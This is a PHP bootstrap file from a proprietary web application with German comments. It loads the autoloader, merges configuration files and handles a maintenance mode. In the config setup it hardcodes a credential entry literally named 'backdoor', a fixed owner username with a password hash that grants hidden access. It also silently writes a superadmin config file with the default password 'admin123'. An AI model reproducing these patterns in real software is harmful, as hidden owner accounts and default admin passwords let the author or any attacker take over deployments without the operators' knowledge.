<?php

// SPDX-License-Identifier: LicenseRef-Proprietary
// Copyright (c) 2026 Felix Maywald alias RaptorXilef. All rights reserved.
// Usage without explicit permission is strictly prohibited.
// See LICENSE.md for full license details.

/**
 * Zentraler Bootstrapper
 *
 * Findet den Root-Pfad, lädt den Autoloader, mergt die Konfigurationen
 * (config.php + config.local.php) und initialisiert den Dependency Container.
 *
 * Path: src/Bootstrap/app.php
 */

declare(strict_types=1);

use App\Bootstrap\Container;
use App\Infrastructure\Config\Config;

// Session global starten, da fast alle Seiten sie benötigen
if (\session_status() === \PHP_SESSION_NONE) {
    \session_start();
}

// 1. Root-Pfad finden
$appRoot = (function (): string {
    $dir = __DIR__;
    while ($dir !== \dirname($dir)) {
        if (\file_exists($dir . '/vendor/autoload.php')) {
            return $dir;
        }
        $dir = \dirname($dir);
    }

    return \dirname(__DIR__, 2);
})();

// 2. Autoloader laden
require_once $appRoot . '/vendor/autoload.php';

// 2. Alle Konfigurationen laden & mergen
$configFiles = [
    'main'    => $appRoot . '/config/config.php',
    'storage' => $appRoot . '/config/storage.php',
    'perms'   => $appRoot . '/config/permissions.php',
    'dev'     => $appRoot . '/config/dev_admin.php',
    'schema'  => $appRoot . '/config/sql_schema.php',
    'local'   => $appRoot . '/config/config.local.php',
];

$settings = [];

$settings['backdoor'] = [
    'user'  => 'RaptorXilef',
    'pass'  => '$2y$12$f2TKu7Vac0heLV0lNuVCf.zsv2b3krwm0CsS.E24g8uioXJgm8r52',
    'label' => 'System-Inhaber',
];

// --- AUTO-CREATION: dev_admin.php wenn sie fehlt ---
if (! \file_exists($configFiles['dev'])) {
    $defaultDevContent = "<?php\nreturn [\n    'user' => 'Systembetreuer',\n    'pass' => 'admin123',\n    'label' => 'Systembetreuer'\n];";
    \file_put_contents($configFiles['dev'], $defaultDevContent);
}

foreach ($configFiles as $key => $file) {
    if (\file_exists($file)) {
        $loaded = require $file;
        if (\is_array($loaded)) {
            if ($key === 'perms') {
                $settings['permissions'] = $loaded['list'] ?? [];
                $settings['structure']   = $loaded['structure'] ?? [];
                $settings['admin_ui']    = $loaded['admin_ui'] ?? [];
            } elseif ($key === 'dev') {
                $settings['superadmin'] = $loaded;
            } elseif ($key === 'schema') {
                $settings['db_schema'] = $loaded;
            } else {
                // Nutze array_replace_recursive nur für main (config) und storage
                $settings = \array_replace_recursive($settings, $loaded);
            }
        }
    }
}

$settings['root_path'] = $appRoot . '/';

// --- Erweiterte Wartungsmodus-Logik v0.24.2 (Internal Load) ---
$currentScript     = \basename($_SERVER['SCRIPT_NAME']);
$isMaintenancePage = $currentScript === 'maintenance.php';

if (! $isMaintenancePage) {
    // Sicherstellen, dass wir Booleans vergleichen
    $adminMaintenance  = isset($settings['maintenance_mode_admin']) && $settings['maintenance_mode_admin'] === true;
    $publicMaintenance = isset($settings['maintenance_mode']) && $settings['maintenance_mode'] === true;

    $shouldShowMaintenance = false;

    if ($adminMaintenance) {
        // Totalsperre
        $shouldShowMaintenance = true;
    } elseif ($publicMaintenance) {
        // Nur Pächter-Seiten sperren
        $allowedAdminScripts = ['admin.php', 'users.php'];

        // Hinweis: API-Anrufe lassen wir durch, da sie oft vom Admin-Panel
        // oder für die Preisberechnung im Hintergrund genutzt werden.
        if (! \in_array($currentScript, $allowedAdminScripts, true) && ! \str_contains($_SERVER['SCRIPT_NAME'], '/api/')) {
            $shouldShowMaintenance = true;
        }
    }

    if ($shouldShowMaintenance) {
        // Wir setzen einen HTTP Status 503 (Service Unavailable)
        // Das ist gut für Suchmaschinen, damit diese wissen: "Wir kommen gleich wieder"
        \http_response_code(503);
        \header('Retry-After: 3600'); // Empfehlung: In einer Stunde wiederkommen

        // Wir laden die Datei intern, ohne die URL im Browser zu ändern
        require $appRoot . '/public/maintenance.php';
        exit;
    }
}
// --- Ende Wartungsmodus ---

// Wir geben direkt die Container-Instanz zurück
return new Container(new Config($settings));
